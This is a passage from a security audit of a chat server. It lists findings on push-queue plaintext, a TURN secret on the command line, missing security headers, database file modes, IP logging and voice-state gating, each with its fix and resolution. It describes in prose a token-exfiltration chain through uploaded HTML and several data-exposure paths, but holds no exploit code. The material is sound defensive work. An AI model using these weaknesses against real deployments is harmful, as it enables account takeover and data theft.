> deleted `media` rows leave behind — that is finding 8's `secure_delete`, not
> this.

## 12. `push_queue` delivers pre-redaction plaintext after a redaction — MEDIUM

Nothing in `handle_redact` touches `push_queue`; the payload is snapshotted at enqueue
(`Migrations.cpp:501-509`). With `max_attempts = 6` and backoff capped at one hour, a
gateway that is down when the message is sent still receives the **full pre-redaction
plaintext** long after the message was deleted for everyone — and the plaintext sits in
`push_queue.payload` in the clear meanwhile. Deleting a pusher
(`PushHandler.cpp:224-228`) also leaves queued rows, which still POST to the old URL.

**Fix.** Add an `event_id` column to `push_queue` and delete matching rows inside the
redaction transaction; delete queued rows when their pusher is deleted. (A push already
*delivered* cannot be recalled — document that.)

> ### RESOLUTION — already fixed by the merge train.
> Verified on `main` @ `ad993a2`. Migration **v22** added `push_queue.event_id`
> exactly as recommended, `SqliteStore.cpp:2281` calls
> `delete_queued_pushes_for_events_locked()` from inside the redaction
> transaction, `delete_room` drains the queue for the room's events
> (`:1093`), and deleting a pusher now deletes its queued rows (`:3377`,
> `:3399`). Nothing further to do here.

## 13. TURN static auth secret is passed on the command line — MEDIUM

`deploy/docker-compose.yml:76-79` passes `--static-auth-secret=${TURN_SECRET}` in
`command:`. The comment (`:71-75`) says this avoids a secret at rest in a config file;
it succeeds at that and creates a different exposure. coturn runs `network_mode: host`,
so its argv is readable from `ps aux`, `/proc/<pid>/cmdline`, `docker inspect`, and
`docker compose config` — i.e. by any host user and anyone in the `docker` group.

With `TURN_SECRET` an attacker mints unlimited valid TURN credentials (the exact
construction is at `src/api/VoiceHandler.cpp:626-638`) and gets a free relay. The
coturn hardening below limits the impact to bandwidth abuse and attack laundering from
your IP, not internal access.

**Fix.** coturn reads `static-auth-secret` from its config file. Write it into
`config/turnserver.conf` — which `setup.sh` already renders and `.gitignore` already
excludes — with mode `0640`, and drop it from argv. That keeps the "no placeholder to
leave unchanged" property while removing it from every process listing.

> ### RESOLUTION — already fixed, in the `deploy` repo.
> `deploy/docker-compose.yml:77` now carries the comment "static-auth-secret is
> NOT passed here. It used to be…"; the secret is rendered into
> `config/turnserver.conf`, and `setup.sh`'s `harden_config()` puts it at 0640
> owned by the coturn uid, failing closed to 0600 rather than widening to 0644.
> Note for the record that `deploy` is a **separate git repository** from
> `server`, so nothing in this branch could have touched it either way.

## 14. No security headers + attacker-controlled `Content-Type` served inline — MEDIUM

The active nginx blocks set no `X-Content-Type-Options`, no `Content-Security-Policy`,
no `Referrer-Policy`, no `X-Frame-Options`; HSTS appears only in the commented-out TLS
blocks. Meanwhile `handle_upload` takes the client's `Content-Type` verbatim
(`src/api/MediaHandler.cpp:184-187`) and `handle_download` echoes it with
`Content-Disposition: inline` (`:311-315`), under a blanket
`Access-Control-Allow-Origin: *` (`Server.cpp:87`).

**Chain:** attacker uploads HTML → shares the `mxc://` → victim opens it in a browser →
because the client builds media URLs with `?access_token=` appended, **the victim's own
token is in `location.search`, readable by the injected script**, which exfiltrates it.
This needs a user-interaction step, so it is Medium — but it converts finding 4 from
"an operator can read the log" into "any user can take over any other user".

**Fix.** `add_header X-Content-Type-Options nosniff always;` and a restrictive CSP on
the media location; `Content-Disposition: attachment` for anything outside a small
image/video/audio allowlist; normalise non-allowlisted upload content-types to
`application/octet-stream` server-side; drop `ACAO: *` on media. Ideally serve media
from a separate origin.

> ### RESOLUTION — server half already fixed; nginx half is in another repo.
> The chain the audit describes is broken at the server. `handle_upload` no
> longer stores the client's `Content-Type`
> (`media_policy::normalise_content_type`), and `handle_download` now sets
> `X-Content-Type-Options: nosniff`, a restrictive `Content-Security-Policy` and
> `Cross-Origin-Resource-Policy: same-origin`, always emits a
> `Content-Disposition`, and **erases** the blanket
> `Access-Control-Allow-Origin: *` that `Server.cpp:91` puts on everything
> (`MediaHandler.cpp:465-499`).
>
> The nginx half is unchanged: `deploy/nginx/bsfchat.conf.template` still has its
> security headers only inside the commented-out TLS blocks (`:299`, `:341`).
> That is now defence in depth rather than the only defence, and it lives in the
> `deploy` repository, outside this branch. Left for whoever owns that repo.

## 15. No encryption at rest and no file mode ever set on the DB — MEDIUM

No SQLCipher, no `PRAGMA key` — `sqlite3_open` on a plain path
(`SqliteStore.cpp:144`). Message plaintext, the full second copy of every body in
`event_search`, the FTS index, `push_queue` payloads and the audit log are all readable
with the `sqlite3` CLI. And no mode is ever set: no `chmod`, `umask` or `fchmod`
anywhere in `src/` or the `Dockerfile`, and `deploy/setup.sh:173` does
`chown -R 10001:10001 data/server` but **never `chmod`** — so the directory stays
`0755` and the DB lands `0644`.

On the current production host the parent path is under `/root`, which is `0700` on
most distros, and that is what saves it. The README does not require that location, so
on any other install every message on the server is world-readable to local users.

**Fix.** `chmod 750 data/server && chmod 640 data/server/*.db*` in `setup.sh`, and/or
`chmod(db_path, 0600)` after open in `SqliteStore`.

> ### RESOLUTION — already fixed, in the `deploy` repo.
> `deploy/setup.sh:293` does `chmod 750 data data/server data/identity` and
> `:301` does `chmod 600` over `data/server/bsfchat.db*`, which covers the WAL
> and shm siblings the audit called out. Encryption at rest (SQLCipher) is not
> done and is a much larger decision; it is not what this finding's Fix asked
> for, and it belongs with finding 8.

## 16. Client IP addresses reach the operator log stream — MEDIUM

`src/api/AuthHandler.cpp:103-108` logs `req.remote_addr` at `warn` when an untrusted
`X-Forwarded-For` arrives, and `:140-145` logs `"Auth lockout engaged for {}"` where
the key is `"ip:" + resolved_address` (`:112-114`).

These are the **only** places a client IP reaches any persistent artifact — see the
verified-correct section, where I confirm no IP is ever written to the database. That
makes them defensible as a security log, and also makes them the whole exposure surface
for a product whose stated pitch is IP privacy. The default log level is `info`,
hardcoded at `src/main.cpp:18` and not configurable at all, so both fire in production.

**Fix.** Hash or truncate the address (`/24`, `/64`) in the lockout line; log a count
rather than the address in the XFF warning.

> ### RESOLUTION — helper landed and tested; the two call sites are handed off.
> `harden/audit-data-path`, 19 Sep 2026. New:
> `bsfchat::redact_ip_for_log()` in `src/http/ClientAddress.{h,cpp}`, four tests
> in `tests/test_auth.cpp`.
>
> `203.0.113.42` → `203.0.113.0/24`; `2001:db8::1:2:3` → `2001:db8::/64`;
> anything it cannot parse → the constant `"unparseable"`. The /64 matches what
> `ClientAddressResolver::resolve` already collapses IPv6 to for rate limiting,
> for the same reason: a subscriber routinely controls a whole /64, so it is the
> smallest unit that names a customer rather than a device.
>
> The last of those four behaviours is the one worth stating. It **never echoes
> its input**. A call site hands this whatever it was given, and if a malformed
> header value fell through to a pass-through branch, an attacker-chosen string
> — possibly a full address in a form the parser missed — would land in the log
> verbatim, which is the bug this function exists to prevent. Tested against
> empty, junk, an out-of-range quad, an injection-shaped string and two addresses
> in one field.
>
> **What is NOT done:** the two call sites. `AuthHandler.cpp` is owned by
> `harden/audit-request-path` and this branch was scoped out of it.
>
> That branch has since merged (`main` @ `c0aecdd`) and it **did not fix this**.
> It wrapped both lockout lines in a new `log_safe()`, which is a log-INJECTION
> guard for a different finding — the submitted login identifier is arbitrary
> unauthenticated bytes and could forge whole log records. Worth having, and
> orthogonal: the address is still printed in full.
>
> So, against `main` as it now stands:
>
>   * `AuthHandler.cpp:124` — the untrusted-`X-Forwarded-For` warning prints
>     `req.remote_addr` twice, at `warn`, rate-limited to once a minute. It
>     should name the redacted network, or log a count.
>   * `AuthHandler.cpp:177`/`:180` — `log_safe(key_a)` / `log_safe(key_b)`
>     should become `log_safe(redact_ip_for_log(...))` **for the `ip:` key
>     only**. This is the trap: the two keys are not the same kind of thing.
>     `key_a` is `"ip:" + address`; `key_b` is `"user:" + the login identifier
>     exactly as submitted`, which is not an address at all and which
>     `redact_ip_for_log` would flatten to `"unparseable"`, destroying the only
>     useful half of the lockout line. Redact the address key, leave the user
>     key to `log_safe`.
>
> A few lines and one include, against a helper that is already tested.
> **Hand-off item.**

## 17. Push payloads default to full plaintext rather than `event_id_only` — MEDIUM

`PushService.cpp:144-148` includes `content` and `sender_display_name` unless the
pusher explicitly set `format: "event_id_only"`. The spec's privacy mode is honoured
but is **not** the default, so a pusher that simply omits `format` gets full message
bodies — both on the wire to the third-party gateway and stored in `push_queue.payload`
in the clear.

**Fix.** Default to `event_id_only` when the pusher does not specify, or make the
default configurable and ship `event_id_only` in the deploy template. Note that even
`event_id_only` still discloses `sender`, `room_id`, `prio` (which encodes "you were
mentioned" / "this is a DM") and `counts.unread` — enough for a gateway operator to
reconstruct a social graph. Consider omitting those too in that mode.

> ### RESOLUTION — already fixed by the merge train.
> `PushService.cpp:144-172`. The privacy mode is now the default rather than an
> opt-in: content is sent only when the pusher set no `format` **and** the
> operator has deliberately set `push.default_payload = "full"`. The audit's
> follow-on point was taken too — `sender` and `type` are withheld in the
> privacy mode as well, where they used to go unconditionally and hand a gateway
> a per-message social graph. `prio` and `counts.unread` remain, with a comment
> saying why and admitting the mode discloses something.

## 18. Presence includes users who left or were server-banned — LOW-MEDIUM

`SyncHandler.cpp:91-131` unions `store_.get_room_members(room_id)`, and
`get_room_members` (`SqliteStore.cpp:756-769`) selects **all** rows with no
`membership` predicate. So `leave` and `ban` rows are included, and a caller receives
`m.presence` — with `last_active_ago` — for accounts that were kicked, left, or are
**server-banned**. That contradicts the ban projection's intent, which deliberately
blanks a banned user's own sync (`SyncEngine.cpp:84-91`).

The co-membership scoping is separately meaningless here (auto-join makes the set the
whole user table), but I rank that **low and largely benign**: the set is flat and
unattributed, it names no room, and on a real deployment every user shares a genuine
public channel with every other. It is a latent bug, not a live disclosure — the day
someone builds per-channel-visible user lists, it becomes the bypass.

**Fix.** Filter to `membership == 'join'` and skip `is_server_banned(uid)`.

> ### RESOLUTION — FIXED.
> `harden/audit-data-path`, 19 Sep 2026. `SyncHandler.cpp`, three tests in
> `tests/test_room_visibility.cpp`.
>
> Filtered at the presence pass rather than in `get_room_members()`, which is
> the part the Fix line gets slightly wrong. That query has two other callers
> and for one of them the unfiltered answer is correct: `GET /rooms/{id}/members`
> is a roster endpoint and is *supposed* to report `leave` and `ban` as
> memberships. Narrowing the shared helper would have quietly changed it.
>
> Both halves of the filter are there and neither is redundant: `membership ==
> join` is the ordinary case, and `is_server_banned()` is the backstop, for the
> same reason `SyncEngine::handle_sync` keeps its own copy of that check — the
> ban projection rewrites the membership rows, so a crash between the ban-list
> write and the projection leaves a `join` row behind and this has to fail closed
> on it. The test for that half deliberately leaves the membership row at `join`.
>
> The third test is a live-peer control, so the other two cannot pass against a
> pass that emits nothing.

## 19. `PUT /rooms/{id}/voice/state` has no membership check at all — LOW-MEDIUM

`VoiceHandler.cpp:526-602`: between the route match (`:534`) and the body parse (`:543`)
there is no `is_room_member` and no `perms.can`. The only thing standing in is the
requirement (`:557-571`) that the caller already holds an `active` `m.call.member` row.

This is **distinct** from the known `voice/join` and `voice/members` findings — those at
least check membership. Impact is bounded (you need an active row first, and the
session-token check at `:575-584` is sound), but a user who joined voice and then left
the room entirely can keep publishing `screen_sharing`/`camera_on`/`muted` into it until
the reaper catches them 10–60 s later. It is a missing gate sitting between two handlers
that do gate (`handle_livekit_token` `:809-810`, `handle_livekit_rekey` `:996-997`).

> ### RESOLUTION — FIXED. The audit understated it.
> `harden/audit-data-path`, 19 Sep 2026. `VoiceHandler::handle_voice_state`, four
> tests in `tests/test_voice.cpp`.
>
> `is_room_member` then `kViewChannel`, the same pair and the same order as
> `voice/join` and `voice/leave`, placed before the body parse.
>
> **Correction to this finding: the impact is not bounded by the reaper.** The
> audit says a revoked user "can keep publishing … until the reaper catches them
> 10–60 s later". They cannot be caught: `handle_voice_state` ends in
> `record_heartbeat()`, so every PUT refreshes the exact liveness the reaper
> expires on. A user who has left the room, or had `VIEW_CHANNEL` revoked, holds
> a live entry on the voice roster of a channel they cannot see — visible to
> everyone in it, with their screen-share and camera flags — for as long as they
> care to keep sending. It is unbounded, not one reap interval.
>
> That is why both refusals return *before* `record_heartbeat()`, and why there
> is a test (`RefusedVoiceStateDoesNotRefreshTheHeartbeat`) asserting that a
> refused PUT leaves the member reapable. Without it the gate would still let a
> revoked user keep their ghost alive by PUTting into a 403.
>
> **Also corrected: the comment in `handle_voice_join` that claimed this endpoint
> was covered.** It argued that join is "the only endpoint that makes someone an
> active call member", which is true and is not enough — the active row records
> that the gate was passed *once*, and both of the gate's inputs change
> afterwards. Authorization cached in a row is not authorization. The comment has
> been rewritten to say so.

## 20. No backup script exists; WAL makes naive backups torn as well as unencrypted — LOW-MEDIUM

`deploy/` contains no `backup.sh` and no cron entry, and its 319-line `README.md` has
zero matches for backup, restore, rsync, tar or `sqlite3`. Whatever runs on the
production host is unreviewed. Because `journal_mode=WAL` leaves `bsfchat.db-wal` and
`bsfchat.db-shm` permanently beside the DB with no shutdown checkpoint, a script that
copies only `bsfchat.db` — what `cp` and `tar` do — produces a **torn** backup; one that
copies all three inherits the full plaintext exposure of findings 8 and 15.

**Fix.** Ship a `backup.sh` using `sqlite3 .backup` or `VACUUM INTO` (both WAL-safe),
writing with mode `0600`, and state in the README that the output contains every
message in plaintext.

---

> ### RESOLUTION — already fixed, in the `deploy` repo.
> `deploy/backup.sh` exists, uses `sqlite3 .backup` (with a long header
> explaining why `cp` of a WAL database is torn twice over), has a `--verify`
> mode that proves an archive restores, and a `--no-media` mode. Separate
> repository; nothing to do here.

# NOTED

## 21. `get_state_events` is the one read of `events` with no `signal_to` filter — LOW

`SqliteStore.cpp:1144-1174` is the single read path over `events` that omits the
addressee clause, and its result goes to every joined member (`SyncEngine.cpp:255`) and
to `GET /rooms/{id}/state`. A signalling event written *with a state_key* would
therefore be broadcast despite a non-NULL `signal_to`. Reaching it requires
`PUT /rooms/{id}/state/m.call.candidates/{key}` (`kManageChannels`), it exposes only the
sender's own address, and the prune removes it within two minutes. **Fix:** add
`AND e.signal_to IS NULL` so the rule is uniform across every read of the table.

> ### RESOLUTION — FIXED.
> `harden/audit-data-path`, 19 Sep 2026. `SqliteStore::get_state_events`, three
> tests in `tests/test_call_privacy.cpp`.
>
> `AND signal_to IS NULL` in **both** places, not just the outer `WHERE`: also
> inside the `MAX(stream_position)` subquery, so a filtered row cannot win the
> latest-per-`(type, state_key)` race and suppress the legitimate state event
> underneath it. That is a bug the one-line version of this fix would have
> introduced.
>
> The clause is on `signal_to`, not on event type, which is what keeps the voice
> roster (`m.call.member`, no address, and the UI cannot work without it) and
> unaddressed legacy signalling behaving exactly as before. There is a control
> test for each.
>
> Agreed with the audit's ranking: reaching this needs `kManageChannels` and the
> prune clears it within two minutes. Fixed anyway because the value of the rule
> is that it is uniform — a reader asking "can signalling reach a bystander"
> should be able to answer from the table's read paths without having to know
> which one was the exception.

## 22. Signalling privacy depends on the client setting `content.to`; unenforced — LOW

`call_signal_addressee` takes `content.to` verbatim — not validated against the user
table, room membership, or the sender — and treats an empty string as `nullopt`, which
is fail-**open** (broadcast). Unreachable from the shipped client (see verified
correct), but it means the IP-privacy property is a client-cooperation guarantee rather
than a server-enforced one: an old or modified client that omits `to` broadcasts its own
ICE candidates to every member, which on this server is everyone.
`CallSignalling.h:34-38` documents this as deliberate. **Recommendation:** since every
shipped client addresses its signalling, reject the five types with 400 when `to` is
absent, behind a config flag defaulting to reject after one release.

> ### RESOLUTION — NOT fixed here; the enforcement point is out of this branch.
> Reviewed and agreed on the merits. The change belongs in the send path in
> `EventHandler`, which `harden/audit-request-path` owns and this branch was
> scoped out of. It cannot go anywhere else: `insert_event` is the wrong layer —
> it is also the path bots, the migration and internal writers use, and a refusal
> there surfaces as a 500 rather than the 400 this wants.
>
> Recording the shape so it is not re-derived. Reject `m.call.invite`,
> `m.call.answer`, `m.call.candidates`, `m.call.hangup` and
> `bsfchat.call.negotiate` with 400 when `content.to` is absent or not a
> non-empty string, behind a config flag defaulting to **permit** for one release
> and **reject** after. The flag is not ceremony: `call_signal_addressee`
> deliberately fails open for every doubtful case, and
> `CallSignalling.h:34-38` argues that an unaddressed event keeps today's
> behaviour because the server cannot guess a recipient without parsing SDP.
> Flipping that to a hard refusal turns "an old client leaks its own address" into
> "an old client cannot make calls at all", and a deployment deserves one release
> with a log line before that lands.
>
> Worth doing. The product's pitch is IP privacy, and today that property is a
> client-cooperation guarantee, not a server-enforced one. **Hand-off item.**

## 23. The signalling prune does not run at startup, contrary to its comment — LOW

`CallSignalling.h:99-100` claims "the sweep runs at startup as well". It does not: the
prune rides the voice reaper thread, whose loop does `reaper_cv_.wait_for(...)` **before**
its first pass (`VoiceHandler.cpp:172-174`). There is a `kReapInterval` gap after every
restart. Harmless in practice; the comment is wrong.

> ### RESOLUTION — FIXED.
> `harden/audit-data-path`, 19 Sep 2026. `VoiceHandler::start_reaper`, two tests
> in `tests/test_voice.cpp`.
>
> The loop now runs its first pass before the first `wait_for`, so
> `CallSignalling.h`'s claim that "the sweep runs at startup as well" is true.
> Free for the ghost reaper it rides with: a process that has just started has no
> stale heartbeats, so its own first pass is a no-op by construction.
>
> The ten seconds were never the point. A retention guarantee written into a
> header and not implemented is, because the next person to reason about the
> signalling TTL will reason from that comment.

## 24. `RAND_bytes` return value discarded when minting media ids — LOW

`MediaHandler.cpp:123` ignores the return code. On failure the id is uninitialised stack
memory, plausibly repeating within a worker thread; because `storage_->upload` (`:199`)
runs *before* `insert_media` (`:202`) and `LocalStorage::upload` truncates, a collision
silently overwrites an existing object's bytes while it stays served under the original
id. Note the inconsistency: the protocol RNG fix landed today deliberately *throws* on
`RAND_bytes` failure. Check the return, and claim the id in the DB before writing the
blob.

> ### RESOLUTION — FIXED. No test, and that is deliberate.
> `harden/audit-data-path`, 19 Sep 2026. `MediaHandler::generate_media_id`.
>
> Throws on `RAND_bytes != 1`, matching `Identifiers.cpp`'s `random_base64` and
> `VoiceHandler`'s session-id minting. This was the last CSPRNG call site in the
> server still ignoring its return code.
>
> `generate_media_id()` also moved **inside** `handle_upload`'s `try`, so the
> throw becomes the 500 the caller should get rather than an exception escaping a
> request handler and dropping the connection.
>
> The audit's second suggestion — claim the id in the DB before writing the blob
> — was **not** taken, because the hazard it addresses is already covered from
> the other side: `handle_upload` removes the blob when `insert_media` throws
> (`MediaHandler.cpp:227-244`), so a failed insert no longer orphans bytes.
> Reordering would buy nothing and would mean a row briefly existing for an
> object with no bytes behind it, which is the state the new media reaper is
> specifically designed to clean up rather than to create.
>
> **No test.** Forcing this branch needs an entropy-source failure, and the only
> way to get one in a test is an injection seam in the RNG — a new indirection on
> a hot path, in production code, to cover three lines that match an established
> convention and are read the same way at two other sites. Not worth it. Saying
> so here rather than leaving a gap for someone to find.

## 25. Event-existence oracle via edit-target error codes — LOW

`EventHandler.cpp:258-292` resolves an edit target **before** checking the room, and the
refusals are distinguishable: 404 (no such event anywhere) / 400 "Edit target is in a
different room" (exists, elsewhere) / 403 (exists here, not yours). Low yield — event
ids are 256-bit post-`671e803`, so there is nothing to enumerate, and existence
discloses no content. Worth collapsing the first two into one response shape next time
the file is touched.

> ### RESOLUTION — out of scope for this branch.
> `EventHandler`'s send and edit path is owned by `harden/audit-request-path`.
> The finding's own recommendation is to collapse the two refusals "next time the
> file is touched", which is that branch. Flagging it here so it is not lost.

## 26. `m.direct` peer side not filtered by membership — LOW

`SqliteStore.cpp:518-537` filters `me.membership = 'join'` but not `peer`, so a peer
whose row is `leave`/`ban` still comes back as the DM's counterparty. Cosmetic — the room
is the caller's own either way — but `m.direct` is not a truthful statement of the
current participant set. Add `AND peer.membership = 'join'`.

> ### RESOLUTION — DECLINED. **This finding is wrong**, and the recommended
> change would be a regression.
> `harden/audit-data-path`, 19 Sep 2026. Two pinning tests added in
> `tests/test_rooms.cpp`; no production change.
>
> The finding calls the fix cosmetic. It is not. `get_direct_rooms` is the only
> thing that tells `/sync` a room is a DM: `attach_direct_rooms`
> (`SyncEngine.cpp:97-103`) turns each `(room, peer)` pair into
> `m.direct[peer] = [room]`, so a pair filtered out by
> `AND peer.membership = 'join'` does not produce a DM with a missing name — the
> room stops being a DM at all, and the client files the conversation under
> channels.
>
> So the recommended one-line change makes a conversation whose other side left
> or was banned **vanish from the DM list**, taking its history with it as far as
> the sidebar is concerned. A conversation you had with someone who has since
> left is still your conversation. `SqliteStore.h:283-287` has said exactly this
> about the function since it was written; the audit did not see the comment.
>
> The caller's *own* side is filtered and stays filtered — a DM the caller left
> is not theirs to be shown. Both properties now have a test, so a later reader
> cannot re-derive the "fix" from this finding's Fix line alone.

## 27. The audit log bypasses VIEW_CHANNEL by design, undocumented — LOW

**The gate itself is correct and was checked precisely.** `AuditHandler.cpp:73` requires
`kManageServer` at **server scope**, and the scope genuinely holds:
`PermissionsEngine::compute` returns `base` at `Permissions.cpp:84` *before*
`get_channel_overrides` is consulted at `:86`, so a per-channel `ALLOW MANAGE_SERVER`
override cannot unlock it. The check is at the top of the only handler, before `limit`,
`actor`, `target_user`, `target_room`, `action` and `from` are read (`:78-132`) — so
pagination and filtering are covered by construction. One route (`Server.cpp:284`), no
write endpoint. A room-scoped moderator cannot read server-wide entries.

The residual: records carry `target_room`, and `audit_room_deletion`
(`AuditLog.cpp:244-278`) stores a deleted channel's `name`, `type`, `parent_id` and
member count, unfiltered against the *reader's* VIEW_CHANNEL. That is almost certainly
intended — an admin who cannot audit hidden channels cannot audit. **Recommendation:
document it in `AuditLog.h` as a decided position; do not filter.** (Minor nit: the
recorded member count uses `get_room_members().size()`, which includes `leave`/`ban` rows
and so overstates.)

> ### RESOLUTION — recommendation taken exactly: documented, not filtered. Plus
> the nit.
> `harden/audit-data-path`, 19 Sep 2026. `src/audit/AuditLog.h`,
> `src/audit/AuditLog.cpp`.
>
> The decided position is now a section at the top of `AuditLog.h`: the
> server-scope check and why it holds, what the records contain, and why they are
> not filtered against the reader's `VIEW_CHANNEL`. The argument, stated there so
> it survives: the holder of `kManageServer` can grant themselves `VIEW_CHANNEL`
> on any channel in one request, so filtering withholds nothing they cannot
> trivially take — it only makes the record incomplete, and an incomplete record
> of who deleted what is worse than no record, because it still reads as
> authoritative. It ends with "Do not add per-record VIEW_CHANNEL filtering",
> which is the sentence this finding existed to produce.
>
> **The minor nit is fixed.** `audit_room_deletion`'s member count used
> `get_room_members().size()`, which includes `leave` and `ban` rows; on this
> server, where auto-join force-joins everyone into everything, it overstated by
> the whole set of people who ever left. It now counts `join` rows only. The
> number exists so a later reader can judge how consequential a deletion was, so
> it has to mean what it says.

## 28. No history-visibility horizon — LOW, by design, worth a decision

Access is evaluated **now**, over **all** history. A user newly granted VIEW_CHANNEL can
immediately `/messages`-paginate and `/search` the channel back to its creation:
`search_messages` has no lower bound on `stream_position`, and resetting a sync token to
`s0` replays everything current permissions allow.

This is the normal Discord-style model and I am not calling it a bug. It is worth stating
because it means **granting someone access for five minutes grants them the entire
archive**. If the product ever wants "history from when you joined", the hook is a
per-(user, room) floor in `get_room_events_paginated` and a `stream_position >=` clause
in `search_messages`.

> ### RESOLUTION — no change. Decision left to Josh, options below.
> Reviewed, agreed it is not a bug, and deliberately not touched. Writing the
> options down so the decision can be made once rather than re-argued.
>
> The behaviour, restated plainly: **granting someone access to a channel for
> five minutes grants them its entire archive.** That is the Discord model and
> most people expect it. It is also the thing that surprises somebody who adds a
> contractor to `#eng` for one thread.
>
> Three positions, in increasing cost:
>
> 1. **Keep it, and say so in the UI.** Cheapest, and it is the honest version of
>    the status quo: the permission dialog for granting `VIEW_CHANNEL` says "and
>    all of this channel's history". No server change. This is the one to take if
>    nobody has asked for anything else.
>
> 2. **A per-(user, room) floor, opt-in per channel.** A `history_from` stream
>    position written when access is granted, honoured by a `stream_position >=`
>    clause in `get_room_events_paginated` and in `search_messages`. Both hooks
>    are named correctly in the finding. This is a schema change, and it has a
>    sharp edge the finding does not mention: a floor is *per user*, so it has to
>    survive a re-grant, and if it is rewritten on every grant then revoking and
>    re-granting becomes a way to *hide* history from someone rather than only to
>    show it. The floor must be a minimum over grants, never a replacement.
>
> 3. **Server-wide "history from when you joined".** Position 2 with the default
>    flipped. Do not do this without the UI from position 1, or every existing
>    member of every channel silently loses their scrollback on upgrade.
>
> My recommendation is 1 now, and 2 only when a customer asks — it is a
> schema change and a permanent complication of the two hottest read paths in the
> product, in exchange for a property nobody has yet asked for.

## 29. Assorted values logged at `info` — LOW

`MediaHandler.cpp:213` logs media id + uploader + size + content-type per upload (media
ids are capability tokens when `require_auth = false`). `AuthHandler.cpp:401` logs the
raw OIDC subject, linking the IdP identity to the local account.
`ProfileHandler.cpp:347` logs nickname values. `S3Client.cpp:223, :269` log S3 error
bodies verbatim. `PushHandler.cpp:247` and `PushService.cpp:192` log push gateway URLs
**whole** — and Matrix gateway URLs routinely carry a per-app secret in the path or
query, so strip the query string there.

---

# MUST LAND BEFORE THE RC (cross-reference, not new)

Live on `main`, already fixed on `fix/joined-rooms-leak`. Not my findings, but
load-bearing for several of mine — finding 2b in particular assumes the attacker can get
the room id, which `/joined_rooms` hands over for free.

- **`GET /joined_rooms`** returns every channel on the server, unfiltered
  (`RoomHandler.cpp:726-736`) — one request, complete private-channel enumeration.
- **`/sync` typing pass** re-adds VIEW_CHANNEL-filtered rooms (`SyncHandler.cpp:70-83`):
  the engine filters `rooms.join`, then the second typing loop walks the **raw** joined
  list and creates an entry for any room with a typist. Passive, real-time disclosure of
  private-channel ids and who is active in them.

Also still open from that document and unchanged here: `voice/join` and `voice/members`
lack VIEW_CHANNEL; `typing`, `read_marker` and `notify_level` are membership-only.

---

# VERIFIED CORRECT

Coverage evidence. Each of these was examined specifically for the leak and found sound
— reported as clean, not as unexamined.

## The IP-privacy feature (migration v17 / `signal_to`) — it does what it claims

The brief asked for a definitive per-type verdict. **`signal_to` is populated on the
write path for all five signalling types, and all three read paths filter correctly.**

It holds because the column is **derived inside the single insert function**, not
supplied by callers — `SqliteStore.cpp:967-968` calls `call_signal_addressee`, and the
comment states the reasoning: *"insert_event is the one door into this table; the rule
lives on the door."* All eight `insert_event` call sites in the server were enumerated;
none bypasses the derivation, and there is no federation ingress, bulk import, or second
INSERT into `events`.

| Event type | Client builder | `to` set? | `signal_to` on write |
|---|---|---|---|
| `m.call.invite` | `CallSignalCodec.h:52-64` | yes, `:58` | **populated** |
| `m.call.answer` | `CallSignalCodec.h:66-77` | yes, `:72` | **populated** |
| `m.call.candidates` | `CallSignalCodec.h:93-111` | yes, `:107` | **populated** |
| `m.call.hangup` | `CallSignalCodec.h:113-122` | yes, `:118` | **populated** |
| `bsfchat.call.negotiate` | `CallSignalCodec.h:81-91` | yes, `:87` | **populated** |

Every `to` argument is a `QMap`/`m_peers` key — a peer user id that cannot be empty.

Read paths: `/sync` incremental (`SqliteStore.cpp:1489`), `/sync` initial timeline
(`:1080`, viewer = the user), and `/messages` history (`:1082`, `signal_to IS NULL` with
**no** viewer exemption at all — history is not a delivery path). Signalling is also
absent from search (the index is written only for `m.room.message`) and from unread
counts. There is **no** `/rooms/{id}/event/{eventId}` and **no** `/context` route, so
`get_event_by_id` — which has no `signal_to` filter — is not reachable from the network
with an attacker-chosen id.

The TTL prune (`:1523-1569`) works, in one transaction, cleaning matching
`event_transactions` rows too; `origin_server_ts` is set server-side
(`EventHandler.cpp:322`), so a client cannot post a far-future timestamp to make its
signalling immortal.

Three caveats are recorded above as findings 21, 22 and 23, and finding 8 is the one that
matters: the purge deleted the rows but did not shred the pages.

## The search path — clean, including the aggregate, and it is the reference implementation

The brief asked me to verify the route comment's claim that "permission filtering happens
inside the query rather than over its output" thoroughly. It holds:

- `searchable` is computed **before** the query from the caller's joined rooms filtered
  by VIEW_CHANNEL (`SearchHandler.cpp:128-133`), and a client-supplied `filter.rooms` can
  only intersect it (`:144-153`), never substitute.
- `search_messages` (`SqliteStore.cpp:1993`) **fails closed**: an empty permitted set
  returns nothing rather than degenerating into an unrestricted search (`:2000`).
- The room restriction lives in a shared `where` clause used by **both** the `COUNT(*)`
  and the row query (`:2027-2033`, `:2062`, `:2077`). So `count` is permission-correct —
  this was the specific thing worth checking, and a naive implementation would have
  counted globally and paginated locally.
- `LIMIT`/`OFFSET` are applied after the restriction, so the attacker-controlled
  `next_batch` offset cannot walk outside it; `more` derives from the restricted total.
- **No snippet is returned at all** — `highlights` echoes the caller's own terms. Ranking
  is `bm25` over the restricted set, so it cannot encode anything about excluded rooms.
- Terms are wrapped as quoted FTS5 phrases with `"` doubled (`:2011-2019`), and
  `tokenize` strips every metacharacter (`SearchHandler.cpp:41-50`), so no input becomes
  a MATCH operator. A step-time FTS error throws rather than degrading to a silent empty
  result (`:2051-2058`).

So: **a search hit cannot reveal the existence or content of a message in a channel the
searcher cannot view — not via a snippet, a count, a ranking, or a room id.**

## The FTS index tracks redaction and edits correctly

`event_search` is populated only for `m.room.message` and **not** for replacements
(`SqliteStore.cpp:1926-1936`), so an edited message is a single hit whose text is
current. `refresh_search_for_event_locked` (`:1935`) recomputes to *nothing* for a
redacted or replacement event, and `reindex_search_locked` (`:1854`) replays the exact
old text to the external-content index to make it forget — the correct FTS5 idiom.
`delete_room` walks the index row by row rather than bulk-deleting (`:573-587`). Redacted
content is genuinely unsearchable (tested, `test_search.cpp:359`). The one residue is at
the file level (finding 8), not the query level.

## Redaction removes the target's own content

The event row survives as a tombstone with `content = '{}'`, `edited_by = NULL` and
`redacted_by` set (`:1292`); mention badges are deleted (`:1303`); search is refreshed
(`:1319`). The gate is right too: `VIEW_CHANNEL` plus self-or-`MANAGE_MESSAGES`
(`EventHandler.cpp:514-528`). Finding 1 is about what it does not reach, not about this.

## Edit authorization is correct

`EventHandler.cpp:286` refuses an edit whose target's sender is not the caller —
`MANAGE_MESSAGES` deliberately does not confer it, matching Discord. Chained edits
resolve to the original with a bounded hop count (`:265-281`), cross-room targets are
refused (`:282`), and a redacted target cannot be edited back into existence (`:294`).
`apply_edit` (`:1188`) re-checks `redacted_by IS NULL` in SQL, so the store enforces it
independently of the handler.

## Every timeline read resolves edits through one path

